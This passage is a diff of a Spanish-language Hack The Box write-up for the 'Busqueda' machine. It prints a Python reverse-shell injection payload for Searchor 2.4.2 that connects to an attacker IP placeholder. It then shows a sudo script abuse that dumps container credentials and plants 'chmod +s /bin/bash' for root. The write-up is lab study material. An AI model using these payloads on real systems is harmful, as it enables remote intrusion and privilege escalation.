@@ -46,6 +46,7 @@ Agregamos el dominio encontrado en el archivo “/etc/hosts” para que sepa a d
 
 ## Website
 Navegamos hasta el servicio web. Encontramos que es una aplicación que se utiliza para realizar búsquedas con diferentes buscadores.
+
 •	https://github.com/ArjunSharda/Searchor.
 
 ![](/assets/images/htb-writeup-busqueda/web.png)
@@ -58,11 +59,13 @@ Vamos a realizar una búsqueda cualquiera e interceptamos la petición con BurpS
 # 2. Explotación
 
 Realizamos la busqueda de posible exploit para el buscardor "searchor".
+
 •	Exploit: https://github.com/jonnyzar/POC-Searchor-2.4.2
 
 Debemos inyectar una carga en la peticion interceptada por Burp.
 
 Carga Util:
+
 •	', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('IP-ATACANTE',PORT-ATACANTE));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
 
 Interceptamos la petición con BurpSuite y agregamos nuestra carga útil.
@@ -98,9 +101,46 @@ Reutilizamos la contraseña para saber que permisos SUDO tiene el usuario “svc
 ![](/assets/images/htb-writeup-busqueda/sudo.png)
 
 No podemos leer el archivo, pero podemos ver algunos de los parámetros permitidos.
+
 •	sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
 
 ![](/assets/images/htb-writeup-busqueda/sudo2.png)
 
+![](/assets/images/htb-writeup-busqueda/sudo3.png)
+
+•	Enlace: https://docs.docker.com/engine/reference/commandline/inspect/
+
+•	sudo python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' mysql_db
+
+![](/assets/images/htb-writeup-busqueda/sudo4.png)
 
 
+Credenciales:
+
+•	yuiu1hoiu4i5ho1uh
+
+•	jI86kGUuj87guWr3RyF
+
+
+
+#!/bin/bash 
+chmod +s /bin/bash
+cat full-checkup.sh
+chmod +x full-checkup.sh
+
+
+![](/assets/images/htb-writeup-busqueda/sudo5.png)
+
+•	sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+
+•	ls -l /bin/bash
+
+•	bash -p
+
+Luego de cambiar a usuario root, capturamos nuestra flag.
+
+•	whoami
+
+•	cat /root/root.txt
+
+![](/assets/images/htb-writeup-busqueda/sudo6.png)
